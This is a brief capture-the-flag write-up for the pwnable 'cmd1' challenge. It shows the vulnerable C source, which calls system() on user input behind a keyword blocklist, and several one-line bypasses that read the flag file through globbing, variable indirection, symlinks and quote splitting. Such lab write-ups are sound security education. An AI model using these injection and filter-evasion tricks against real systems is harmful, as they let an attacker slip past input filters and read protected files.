cmd1


cmd1@pwnable:~$ ./cmd1 ls
sh: 1: ls: not found
cmd1@pwnable:~$ ./cmd1 /bin/ls
cmd1  cmd1.c  flag
cmd1@pwnable:~$ ./cmd1 /bin/python
sh: 1: /bin/python: not found
cmd1@pwnable:~$ bat
The program 'bat' can be found in the following packages:
 * bacula-console-qt
 * bareos-bat
Ask your administrator to install one of them
cmd1@pwnable:~$ ./cmd1 "/bin/cat cmd1.c"
#include <stdio.h>
#include <string.h>

int filter(char* cmd){
        int r=0;
        r += strstr(cmd, "flag")!=0;
        r += strstr(cmd, "sh")!=0;
        r += strstr(cmd, "tmp")!=0;
        return r;
}
int main(int argc, char* argv[], char** envp){
        putenv("PATH=/thankyouverymuch");
        if(filter(argv[1])) return 0;
        system( argv[1] );
        return 0;
}

My solve:
cmd1@pwnable:~$ ./cmd1 "/bin/cat *lag"
mommy now I get what PATH environment is for :)


some interesting solves from the writeups:
export f=flag ; ./cmd1 "/bin/cat \$f"

mkdir /tmp/99991111 
cd /tmp/99991111
ln -s /home/cmd1/flag ./symlink_file
/home/cmd1/cmd1 '/bin/cat ./symlink_file'

./cmd1 '/bin/cat fl""ag'

./cmd1 "/bin/cat 'f' 'l' 'a' 'g'"